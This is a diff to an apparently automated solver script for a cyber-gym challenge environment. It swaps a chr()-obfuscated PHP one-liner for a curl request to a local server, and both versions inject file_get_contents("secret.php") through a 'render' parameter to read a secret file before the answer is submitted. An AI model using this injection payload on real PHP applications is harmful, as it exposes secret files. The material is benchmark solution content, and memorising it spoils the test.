@@ -26,12 +26,9 @@ async def main():
     if HARD_ANSWER:
         result = await client.reset(seed=2, split="train", index=5)
         print("hard task:", result.observation.task_id)
-        php = ("cd www && php -r '$_GET[chr(114).chr(101).chr(110).chr(100).chr(101).chr(114)]"
-               "=chr(102).chr(105).chr(108).chr(101).chr(95).chr(103).chr(101).chr(116).chr(95)"
-               ".chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115).chr(40)"
-               ".chr(34).chr(115).chr(101).chr(99).chr(114).chr(101).chr(116).chr(46).chr(112)"
-               ".chr(104).chr(112).chr(41); include chr(105).chr(110).chr(100).chr(101).chr(120)"
-               ".chr(46).chr(112).chr(104).chr(112);' 2>&1 | tail -1")
+        php = ("nohup php -S 127.0.0.1:8099 -t www >/dev/null 2>&1 & sleep 1.5; "
+                "curl -s --get --data-urlencode 'render=file_get_contents(" + chr(34) + "secret.php" + chr(34) + ")' "
+                "http://127.0.0.1:8099/index.php")
         result = await client.step(CybergymIncidentsOctAction(cmd=php))
         print("php-solve output:", (result.observation.output or "")[:200])
         result = await client.step(CybergymIncidentsOctAction(answer=HARD_ANSWER))
